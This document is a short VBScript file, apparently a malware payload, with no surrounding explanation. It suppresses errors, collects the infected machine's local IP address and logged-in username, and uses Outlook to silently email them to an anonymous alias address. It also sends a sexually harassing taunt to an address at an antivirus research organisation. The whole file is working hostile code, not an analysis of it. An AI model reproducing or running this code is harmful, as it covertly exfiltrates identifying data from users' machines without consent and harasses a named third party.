Dim theApp, theNameSpace, theMailItem
Dim IPSocket
On Error Resume Next
Set IPSocket = CreateObject("MSWinsock.Winsock")
IPADDY = IPSocket.LocalIP
set BOB = CreateObject("Wscript.Network")
For x = 1 To 2
If x = 1 Then EMADDY = "avm@nym.alias.net" Else EMADDY = "nick@virusbtn.com"
if x = 1 then MSGBDY = IPADDY else MSGBDY = "Dear Nicky... my name is Jacky and I want to make hot monkey love with you. You anti-virus stud!"
Set theApp = WScript.CreateObject("Outlook.Application")
Set theNameSpace = theApp.GetNameSpace("MAPI")
theNameSpace.Logon "profile", "password"
Set theMailItem = theApp.CreateItem(0)
theMailItem.Recipients.Add EMADDY
theMailItem.Subject = BOB.Username
theMailItem.Body = MSGBDY
theMailItem.Send
theNameSpace.Logoff
Next
